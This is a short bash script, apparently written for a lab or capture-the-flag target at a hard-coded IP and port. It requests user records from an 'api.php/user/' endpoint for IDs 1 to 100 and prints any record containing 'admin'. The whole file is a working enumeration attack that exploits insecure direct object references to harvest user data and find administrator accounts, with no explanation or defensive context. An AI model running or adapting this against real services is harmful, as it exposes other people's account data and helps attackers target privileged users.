#!/usr/bin/env bash

url="http://94.237.59.225:47035"
api_uri="api.php/user/"

echo "Searching for admin users..."

for i in {1..100}; do
    response=$(curl -s -X GET "$url/$api_uri/$i")
    if echo "$response" | grep -qi "admin"; then
        echo "ID: $i → $response"
    fi
done

